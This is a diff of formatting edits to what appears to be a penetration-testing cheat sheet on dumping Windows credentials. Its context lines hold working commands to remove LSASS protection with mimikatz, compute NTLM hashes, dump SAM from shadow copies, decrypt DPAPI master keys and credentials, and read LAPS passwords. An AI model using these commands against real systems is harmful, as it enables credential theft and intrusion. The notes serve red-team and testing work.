@@ -25,7 +25,7 @@ if the logonpassword command returns an error `Handle on memory (0x00000005)` do
 !processprotect /process:lsass.exe /remove
 ```
 
-## NTLM From Password
+## Password To NTLM
 
 ```
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
@@ -58,7 +58,7 @@ Possible backups location
 
 #### ShadowCopy Exploit
 
-It is possible to retrieve and dump keys from old backup versions of the system saved with ShadowCopy. Once the backup version is exposed you can dump the SAM credentials and extract  DPAPI hashes. All the following operations require Admin privileges
+It is possible to retrieve and dump keys from old backup versions of the system saved with ShadowCopy. Once the backup version is exposed you can dump the SAM credentials and extract DPAPI hashes. All the following operations require Admin privileges
 
 Enumerate existing copies
 
@@ -157,7 +157,7 @@ Enumerate Credentials hashes. The parameter `guidMasterKey` reveals the hash of 
 dpapi::cred /in:"<path to cred hash>" 
 ```
 
-Retrieve the master key, decode it and store the key in cache. In order to decrypt the key we need to be operating under the same context (user, system) the key belongs to.&#x20;
+Retrieve the master key, decode it and store the key in cache. In order to decrypt the key we need to be operating under the same context (user, system) the key belongs to.
 
 ```
 dpapi::masterkey /in:"<Path to MasterKeyGUID>" 
@@ -194,7 +194,7 @@ Get users of the detected group
 net groups "<group>"
 ```
 
-Run the following command in the context of a user part of the  group allowed to interact with LAPS to dump the stored passwords. The target is the machine with LAPS enabled
+Run the following command in the context of a user part of the group allowed to interact with LAPS to dump the stored passwords. The target is the machine with LAPS enabled
 
 ```
 Get-AdmPwdPassword -ComputerName <target>
